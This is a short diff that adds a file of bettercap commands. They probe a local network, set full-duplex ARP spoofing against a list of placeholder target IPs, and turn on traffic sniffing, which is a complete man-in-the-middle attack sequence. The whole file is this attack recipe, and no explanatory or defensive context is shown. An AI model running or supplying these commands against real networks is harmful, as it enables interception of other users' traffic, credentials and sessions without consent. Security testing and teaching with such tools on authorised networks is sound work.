@@ -1,1 +1,8 @@
-
+sudo bettercap
+net.probe on
+net.recon on
+net.show
+set arp.fullduplex true
+set arp.targets ip1,ip2,ip3...
+arp.spoof on
+net.sniff on
